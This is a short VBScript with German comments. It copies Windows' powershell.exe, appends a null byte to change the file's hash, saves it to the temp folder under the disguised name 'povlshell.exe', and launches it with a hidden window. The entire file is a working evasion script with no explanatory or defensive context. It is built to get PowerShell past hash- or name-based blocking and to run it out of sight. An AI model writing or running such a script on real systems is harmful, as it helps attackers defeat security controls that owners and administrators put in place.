Dim Filename
Dim Bytearray()
Dim bin
Dim Arraylength
Dim newFilename
Dim dir
Dim name
Dim retval

Filename = "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe"

Set bin = CreateObject("ADODB.Stream")
bin.Type = 1
bin.Open
bin.LoadFromFile Filename
Bytearray = bin.Read
bin.Close

' Länge des Arrays bestimmen und ein Null-Byte anhängen
Arraylength = UBound(Bytearray) - LBound(Bytearray) + 1
ReDim Preserve Bytearray(Arraylength)
Bytearray(Arraylength) = 0

bin.Open
bin.Write Bytearray

dir = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
name = "povlshell.exe"
newFilename = dir & "\" & name

bin.SaveToFile newFilename, 2
bin.Close
Set bin = Nothing

' Datei ausführen
retval = CreateObject("WScript.Shell").Run(newFilename, 0, False)
